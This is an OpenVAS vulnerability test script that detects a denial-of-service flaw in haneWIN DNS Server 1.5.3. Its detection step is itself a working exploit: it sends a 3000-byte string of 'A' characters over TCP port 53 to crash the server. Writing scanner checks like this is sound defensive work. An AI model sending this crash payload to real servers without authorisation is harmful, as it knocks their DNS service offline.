###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hanewin_dns_server_dos_vuln.nasl 9354 2018-04-06 07:15:32Z cfischer $
#
# haneWIN DNS Server Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803796");
  script_version("$Revision: 9354 $");
  script_bugtraq_id(65024);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:15:32 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2014-01-28 19:50:58 +0530 (Tue, 28 Jan 2014)");
  script_name("haneWIN DNS Server Denial Of Service Vulnerability");

   tag_summary =
"This host is running haneWIN DNS server and is prone to denial of service
vulnerability.";

  tag_vuldetect =
"Send crafted request and check is it vulnerable to DoS or not.";

  tag_insight =
"The flaw is due to an error when handling specially crafted requests which can
be exploited to crash the server.";

  tag_impact =
"Successful exploitation will allow remote attacker to cause a denial of service.

Impact Level: Application";

  tag_affected =
"haneWIN DNS Server version 1.5.3";

  tag_solution =
"No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/31014");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(53);
  exit(0);
}


## Variable Initialization
DnsSock = "";
DnsRecv = "";
DnsPort = 53;

## Check the port status
if(!get_port_state(DnsPort)){
  exit(0);
}

## exit if socket is not created
DnsSock = open_sock_tcp(DnsPort);
if(!DnsSock){
  exit(0);
}

send(socket:DnsSock, data:"Check haneWIN DNS Server is running");
DnsRecv = recv(socket:DnsSock, length:1024);

## Confirm the server
if("haneWIN DNS Server is running" >!< DnsRecv)
{
  close(DnsSock);
  exit(0);
}

## Construct the bad request
BadData = crap(length:3000, data:"A");
send(socket:DnsSock, data:BadData);

DnsRecv = recv(socket:DnsSock, length:1024);

## confirm the exploit
if(!DnsRecv)
{
  security_message(DnsPort);
  exit(0);
}

close(DnsSock);
